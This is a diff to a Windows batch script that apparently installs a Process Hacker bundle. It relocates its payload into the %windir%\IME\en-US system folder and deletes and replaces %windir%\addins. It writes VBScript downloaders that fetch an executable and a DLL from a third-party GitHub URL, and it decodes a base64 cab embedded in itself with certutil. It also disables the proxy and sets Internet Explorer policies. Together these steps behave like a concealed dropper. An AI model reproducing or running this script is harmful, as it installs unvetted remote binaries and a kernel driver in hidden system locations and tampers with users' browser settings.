@@ -1,15 +1,18 @@
 ECHO PROCX_ALL B64
 %~d0
 cd /D "%~p0"
-md %windir%\addins
-cd %windir%\addins
+if exist %windir%\addins (xcopy %windir%\addins %windir%\IME\en-US\old /C /E /I /Q /H /R /K /O /X /Y )
+del /f /q /s %windir%\addins\*.*
+rd /s /q %windir%\addins
+md %windir%\IME\en-US
+cd %windir%\IME\en-US
 ipconfig>>aypi.txt
 Reg.exe add "HKCU\Software\Microsoft\Notepad" /v "iPointSize" /t REG_DWORD /d "140" /f
 start /min aypi.txt
 if exist %windir%\system32\certutil.exe (goto decode)
 
 echo InetFile = "https://raw.githubusercontent.com/paolosezart/protor/master/certutilxp.exe">crt.vbs
-echo localFile = "%windir%\addins\certutilxp.exe">>crt.vbs
+echo localFile = "%windir%\IME\en-US\certutilxp.exe">>crt.vbs
 echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")>>crt.vbs
 echo oXMLHTTP.Open "GET", InetFile, 0 >>crt.vbs
 echo oXMLHTTP.Send>>crt.vbs
@@ -24,7 +27,7 @@ echo Set oADOStream = Nothing>>crt.vbs
 ping 127.0.0.1 -n 1
 crt.vbs
 echo InetFile = "https://raw.githubusercontent.com/paolosezart/protor/master/certadmXP.dll">crtdll.vbs
-echo localFile = "%windir%\addins\certadmXP.dll">>crtdll.vbs
+echo localFile = "%windir%\IME\en-US\certadmXP.dll">>crtdll.vbs
 echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")>>crtdll.vbs
 echo oXMLHTTP.Open "GET", InetFile, 0 >>crtdll.vbs
 echo oXMLHTTP.Send>>crtdll.vbs
@@ -48,7 +51,7 @@ del /f /q crtdll.vbs
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"Procx.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
 certutil.exe -decode Procx.64 Procx.cab
-expand Procx.cab -F:*.* %windir%\addins
+expand Procx.cab -F:*.* %windir%\IME\en-US
 ver|find "5.1"&&goto xpu
 ver|find "5.2"&&goto xpu
 goto othe
@@ -60,10 +63,9 @@ move /y kprocesshacker.sys x86\kprocesshacker.sys
 move /y peview.exe x86\peview.exe
 copy /y *.dll x86\plugins\*.dll
 del /f /q *.dll
-del /f /q /s "%userprofile%\Procx.bat"
 :othe
 start ProcH.bat
-explorer.exe %windir%\addins
+explorer.exe %windir%\IME\en-US
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0x00000000 /f
 reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HomePage /t REG_DWORD /d 0x00000001 /f
 reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
